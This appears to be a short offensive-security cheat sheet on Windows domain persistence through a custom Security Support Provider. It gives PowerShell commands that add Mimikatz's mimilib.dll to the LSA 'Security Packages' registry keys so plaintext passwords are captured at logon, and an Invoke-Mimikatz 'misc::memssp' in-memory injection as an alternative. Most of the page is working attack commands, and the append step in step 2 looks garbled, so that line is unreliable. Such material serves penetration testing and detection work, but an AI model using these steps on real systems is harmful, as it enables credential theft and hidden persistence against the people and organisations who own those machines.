---
legal-banner: true
---

### **Domain Persistence via Custom SSP**

Custom Security Support Providers (SSPs) can be used to capture plaintext passwords from users who log on.  
This guide provides steps to set up a custom SSP using a DLL, such as `mimilib.dll` from Mimikatz.  

### **Steps to Set Up a Custom SSP**

1. Get current security packages: 
   ```powershell
   $packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
   ```

2. Append the custom DLL (e.g., mimilib):  
   ```powershell
   $packages `= "mimilib"
   ```

3. Update the **OSConfig** registry key with the new packages:  
   ```powershell
   Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages' -Value $packages
   ```

4. Update the **Lsa** registry key with the new packages:  
   ```powershell
   Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages' -Value $packages
   ```

5. Alternative method using Mimikatz to inject mimilib:  
   ```powershell
   Invoke-Mimikatz -Command '"misc::memssp"'
   ```